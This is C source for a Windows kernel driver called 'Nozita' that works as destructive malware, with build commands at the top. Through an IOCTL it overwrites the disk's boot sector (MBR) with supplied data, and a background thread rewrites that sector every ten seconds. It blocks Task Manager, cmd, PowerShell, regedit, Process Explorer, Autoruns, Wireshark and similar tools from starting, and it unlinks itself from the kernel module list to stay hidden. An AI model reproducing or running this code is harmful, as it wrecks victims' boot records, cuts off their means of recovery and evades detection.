// drv.c — Nozita Ring-0 Kernel Driver (WDM)
// cl /W4 /kernel /FI ntddk.h drv.c /link /DRIVER /SUBSYSTEM:NATIVE
//    /NODEFAULTLIB /ENTRY:DriverEntry ntoskrnl.lib hal.lib /OUT:nozita_drv.sys

#include <ntddk.h>

#define MBR_REWRITE_INTERVAL_SEC  10
#define DEVICE_NAME  L"\\Device\\NozitaGuard"
#define SYMLINK_NAME L"\\DosDevices\\NozitaGuard"
#define IOCTL_SET_MBR CTL_CODE(0x8000,0x800,METHOD_BUFFERED,FILE_WRITE_DATA)

static const UNICODE_STRING g_KillList[] = {
    RTL_CONSTANT_STRING(L"taskmgr.exe"),
    RTL_CONSTANT_STRING(L"regedit.exe"),
    RTL_CONSTANT_STRING(L"cmd.exe"),
    RTL_CONSTANT_STRING(L"powershell.exe"),
    RTL_CONSTANT_STRING(L"procexp.exe"),
    RTL_CONSTANT_STRING(L"procexp64.exe"),
    RTL_CONSTANT_STRING(L"procmon.exe"),
    RTL_CONSTANT_STRING(L"procmon64.exe"),
    RTL_CONSTANT_STRING(L"msconfig.exe"),
    RTL_CONSTANT_STRING(L"mmc.exe"),
    RTL_CONSTANT_STRING(L"autoruns.exe"),
    RTL_CONSTANT_STRING(L"autoruns64.exe"),
    RTL_CONSTANT_STRING(L"wireshark.exe"),
};
#define KILL_COUNT (sizeof(g_KillList)/sizeof(g_KillList[0]))

static UINT8   g_SavedMBR[512] = {0};
static BOOLEAN g_HasMBR        = FALSE;
static HANDLE  g_WorkerThread  = NULL;
static BOOLEAN g_Stopping      = FALSE;
static KEVENT  g_StopEvent;

static NTSTATUS WriteSector0(const VOID* data) {
    UNICODE_STRING dn;
    RtlInitUnicodeString(&dn, L"\\Device\\Harddisk0\\DR0");
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &dn, OBJ_CASE_INSENSITIVE|OBJ_KERNEL_HANDLE, NULL, NULL);
    HANDLE h; IO_STATUS_BLOCK iosb;
    NTSTATUS s = ZwOpenFile(&h, GENERIC_READ|GENERIC_WRITE|SYNCHRONIZE, &oa, &iosb,
        FILE_SHARE_READ|FILE_SHARE_WRITE, FILE_SYNCHRONOUS_IO_NONALERT|FILE_NON_DIRECTORY_FILE);
    if (!NT_SUCCESS(s)) return s;
    LARGE_INTEGER off; off.QuadPart = 0;
    s = ZwWriteFile(h, NULL, NULL, NULL, &iosb, (PVOID)data, 512, &off, NULL);
    ZwClose(h); return s;
}

static NTSTATUS ReadSector0(VOID* buf) {
    UNICODE_STRING dn;
    RtlInitUnicodeString(&dn, L"\\Device\\Harddisk0\\DR0");
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &dn, OBJ_CASE_INSENSITIVE|OBJ_KERNEL_HANDLE, NULL, NULL);
    HANDLE h; IO_STATUS_BLOCK iosb;
    NTSTATUS s = ZwOpenFile(&h, GENERIC_READ|SYNCHRONIZE, &oa, &iosb,
        FILE_SHARE_READ|FILE_SHARE_WRITE, FILE_SYNCHRONOUS_IO_NONALERT|FILE_NON_DIRECTORY_FILE);
    if (!NT_SUCCESS(s)) return s;
    LARGE_INTEGER off; off.QuadPart = 0;
    s = ZwReadFile(h, NULL, NULL, NULL, &iosb, buf, 512, &off, NULL);
    ZwClose(h); return s;
}

static void HideFromModuleList(PDRIVER_OBJECT DriverObject) {
    typedef struct _LDR_ENTRY {
        LIST_ENTRY InLoadOrderLinks;
        LIST_ENTRY InMemoryOrderLinks;
        LIST_ENTRY InInitializationOrderLinks;
        PVOID DllBase; PVOID EntryPoint; ULONG SizeOfImage;
        UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName;
    } LDR_ENTRY, *PLDR_ENTRY;
    PLDR_ENTRY e = (PLDR_ENTRY)DriverObject->DriverSection;
    if (!e) return;
    RemoveEntryList(&e->InLoadOrderLinks);
    RemoveEntryList(&e->InMemoryOrderLinks);
    RemoveEntryList(&e->InInitializationOrderLinks);
}

static void ProcessNotify(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo) {
    UNREFERENCED_PARAMETER(Process); UNREFERENCED_PARAMETER(ProcessId);
    if (!CreateInfo || !CreateInfo->ImageFileName) return;
    UNICODE_STRING imgName = *CreateInfo->ImageFileName;
    UNICODE_STRING baseName = imgName;
    for (USHORT i = imgName.Length / sizeof(WCHAR); i > 0; i--) {
        if (imgName.Buffer[i-1] == L'\\') {
            baseName.Buffer = &imgName.Buffer[i];
            baseName.Length = imgName.Length - (USHORT)(i * sizeof(WCHAR));
            baseName.MaximumLength = baseName.Length;
            break;
        }
    }
    for (ULONG i = 0; i < KILL_COUNT; i++) {
        if (RtlEqualUnicodeString(&baseName, &g_KillList[i], TRUE)) {
            CreateInfo->CreationStatus = STATUS_ACCESS_DENIED;
            return;
        }
    }
}

static void WorkerThread(PVOID ctx) {
    UNREFERENCED_PARAMETER(ctx);
    LARGE_INTEGER interval;
    interval.QuadPart = -(LONGLONG)MBR_REWRITE_INTERVAL_SEC * 10000000LL;
    while (!g_Stopping) {
        if (g_HasMBR) {
            UINT8 cur[512];
            if (NT_SUCCESS(ReadSector0(cur))) {
                if (RtlCompareMemory(cur, g_SavedMBR, 8) != 8)
                    WriteSector0(g_SavedMBR);
            } else {
                WriteSector0(g_SavedMBR);
            }
        }
        KeWaitForSingleObject(&g_StopEvent, Executive, KernelMode, FALSE, &interval);
        if (g_Stopping) break;
    }
    PsTerminateSystemThread(STATUS_SUCCESS);
}

static NTSTATUS DispatchSuccess(PDEVICE_OBJECT dev, PIRP irp) {
    UNREFERENCED_PARAMETER(dev);
    irp->IoStatus.Status = STATUS_SUCCESS;
    irp->IoStatus.Information = 0;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static NTSTATUS DispatchControl(PDEVICE_OBJECT dev, PIRP irp) {
    UNREFERENCED_PARAMETER(dev);
    PIO_STACK_LOCATION isl = IoGetCurrentIrpStackLocation(irp);
    NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
    if (isl->Parameters.DeviceIoControl.IoControlCode == IOCTL_SET_MBR) {
        if (isl->Parameters.DeviceIoControl.InputBufferLength >= 512) {
            RtlCopyMemory(g_SavedMBR, irp->AssociatedIrp.SystemBuffer, 512);
            g_HasMBR = TRUE;
            WriteSector0(g_SavedMBR);
            status = STATUS_SUCCESS;
        } else {
            status = STATUS_INVALID_BUFFER_SIZE;
        }
    }
    irp->IoStatus.Status = status;
    irp->IoStatus.Information = 0;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return status;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);
    UNICODE_STRING devName, symName;
    RtlInitUnicodeString(&devName, DEVICE_NAME);
    RtlInitUnicodeString(&symName, SYMLINK_NAME);
    PDEVICE_OBJECT devObj = NULL;
    NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &devObj);
    if (!NT_SUCCESS(status)) return status;
    IoCreateSymbolicLink(&symName, &devName);
    devObj->Flags |= DO_BUFFERED_IO;
    devObj->Flags &= ~DO_DEVICE_INITIALIZING;
    for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
        DriverObject->MajorFunction[i] = DispatchSuccess;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchControl;
    PsSetCreateProcessNotifyRoutineEx(ProcessNotify, FALSE);
    HideFromModuleList(DriverObject);
    KeInitializeEvent(&g_StopEvent, NotificationEvent, FALSE);
    HANDLE hThread;
    PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, WorkerThread, NULL);
    ObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, NULL, KernelMode, (PVOID*)&g_WorkerThread, NULL);
    ZwClose(hThread);
    return STATUS_SUCCESS;
}
